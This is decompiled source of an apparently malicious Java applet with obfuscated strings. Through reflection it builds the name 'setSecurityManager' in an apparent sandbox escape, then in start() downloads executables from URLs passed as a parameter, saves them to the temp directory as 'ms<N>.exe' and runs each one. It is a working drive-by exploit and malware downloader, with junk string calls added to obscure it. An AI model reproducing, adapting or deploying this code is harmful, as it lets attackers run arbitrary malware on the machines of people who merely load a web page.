import java.awt.Component;
import java.util.HashSet;
import java.net.URL;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class asa extends Applet
{
    private JList h;
    
    private static FileOutputStream C(final String r) {
        try {
            return new FileOutputStream(r);
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    private static InputStream b(String r) {
        try {
            ((URL)(r = (String)new URL(r))).openConnection();
            return (InputStream)(r = (String)Class.forName(d.r(m.C("java.net.URL"))).getMethod(d.r(m.C("openStream")), (Class<?>[])new Class[0]).invoke(r, new Object[0]));
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    public asa() {
        d.r(m.C("dkfjglhjkdfhngyugfiushdfioghsiudfhgklsdhguisfasdf "));
        d.r(m.C("jfghsflghsdflhgiuoehjglkzhifugydhfgkjsdfgdfg "));
        d.r(m.C("mklsgjdglishdifghsdufhguishgkjdhfjgklhdsfiug "));
        d.r(m.C("sdjfsdhfluihfishdfoiwhjfskldjhflusdgfjskdsldkjhfjskhdflfd "));
        d.r(m.C("dkfjglhjkdfhngsdyugfiushdfioghsiudfhgklsdhguisfasdf "));
        d.r(m.C("jfghsflghsdfdflhgiuoehjglkzhifugydhfgkjsdfgdfg "));
        d.r(m.C("mklsasdqwjdglishdifghsdufhguishgkjdhfjgklhdsfiug "));
        d.r(m.C("sdjfsdhfluihfishdfoiwhjfskldjhflusdgfjskdsldkjhfjskhdflfd "));
        d.r(m.C("mhdsgfhsdfoiqijodqhjwkfjshfgjygsdfjkhkdluqhgdagsdfyuatfsdgjkajsdklahdgashdjkahsdiuqhgwdjkalsjduiaosydhjkqhwdjk "));
        final HashSet r;
        (r = new HashSet()).add(new b(System.class, new StringBuffer(d.r(m.C("fg6"))).append(d.r(m.C("set"))).append(d.r(m.C("5ZSecu")).substring(2)).append(d.r(m.C("rity")).concat(d.r(m.C("3134OM")).substring(5))).append(d.r(m.C("lKana")).substring(2).concat(d.r(m.C("ger")))).substring(3), new Object[1]));
        d.r(m.C("wzqqqqqqqqo58Udfqdasd0lqTghjsdfsdfghghjEiGggqskr7nw "));
        d.r(m.C("NeasdaqsdfsdHDrcdFsdfsdf9O4mwtRkVQEKdghjgh"));
        d.r(m.C("y8dqqqqHsdfsdhjkhjkdfsdfsdfhjkhjkhjkhjkhj"));
        this.add(this.h = new JList(new Object[] { new r(this, r) }));
    }
    
    @Override
    public void start() {
        super.start();
        try {
            final String[] split = this.getParameter(d.r(m.C("url"))).split(d.r(m.C("!##")));
            String s2;
            final String s = s2 = System.getProperty(d.r(m.C("java.io.tmpdir")));
            if (s.charAt(s.length() - 1) != '\\') {
                s2 += d.r(m.C("\\"));
            }
            Integer n2;
            int n = n2 = 0;
            int n3 = split.length;
            while (n < n3 && split[n2].length() != 0) {
                final String string = s2 + d.r(m.C("ms")) + n2 + (d.r(m.C("dsasm.ex")).substring(5) + d.r(m.C("e")));
                final InputStream b = b(split[n2]);
                final FileOutputStream c = C(string);
                final byte[] array = new byte[1024];
                InputStream inputStream = b;
                byte[] array2 = array;
                int read;
                while ((read = inputStream.read(array2, 0, array.length)) != -1) {
                    c.write(array, 0, read);
                    inputStream = b;
                    array2 = array;
                }
                b.close();
                c.close();
                final String s3 = string;
                try {
                    Runtime.getRuntime().exec(s3);
                }
                catch (Exception ex) {}
                n = ++n2;
                n3 = split.length;
            }
            b(split[n2 - 1] + d.r(m.C(""))).close();
        }
        catch (Exception ex2) {}
    }
}
